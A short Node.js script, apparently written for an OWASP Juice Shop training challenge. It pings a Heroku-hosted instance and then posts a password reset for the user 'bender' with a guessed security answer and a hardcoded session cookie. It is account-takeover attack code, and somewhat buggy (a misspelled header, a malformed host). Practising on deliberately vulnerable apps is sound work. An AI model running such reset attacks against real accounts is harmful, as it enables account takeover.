//config vars
const fs = require('fs');
const http = require('http');
const events = require('events');

const basePath = 'http://juice-shop-jerec.herokuapp.com';
const postPath = '/rest/user/reset-password';
//Make sure to update this with your cookie
const cookie='QmOwV728vMxg6Y3rpRakJndKVHXhQunh8JtqmAl4NWqjE5oXP1yz9bKLeZBD';

let mainRan = false;

class Emitter extends events{}
const main = new Emitter();

function callEnd(){
    console.log('Script Has Ended. General Kenobi!!');
}

//Form Data to submit
const data = JSON.stringify({
    email:"bender@juice-sh.op",
    answer:"test",
    new:"test123",
    repeat:"test123"
});

///Main program
///Summary: Code to execute if site is online
main.on('siteOnline', ()=>{
    //This was running twice, set up bool to make sure it only submits once
    if(!mainRan)
    {
        mainRan = true;
        let formSub = http.request({
            host: basePath,
            path: postPath,
            method: 'POST',
            headers: {
                'Contenet-Type': 'application/json, text/plain',
                'Content-Length': data.length,
                'Cookie': cookie,
                'Connection': 'keep-alive'
            }
        }, (postResp)=>{
            if(postResp.statusCode === 200)
            {
                console.log('Post Successful');
            }
            else{
                console.log('recieved status', postResp.statusCode);
            }
        });
        
        console.log('submitting post');
        formSub.write(data);
        formSub.end();
    }
});

//Code that starts the proverbial ball rolling
//Determine if application is still running and run the script if so
console.log('Script Starting, Hello There')
console.log('Pinging: ', basePath);

let req = http.get(basePath, (resp)=>{
    if(resp.statusCode === 200){
        console.log('Ping Successful');
    }
    else{
        console.log('Site Offline, terminating process . . .');
        callEnd();
    }
    resp.on('data', (chunk)=>{
        main.emit('siteOnline');
    });
});

//This submits the http request
req.end();




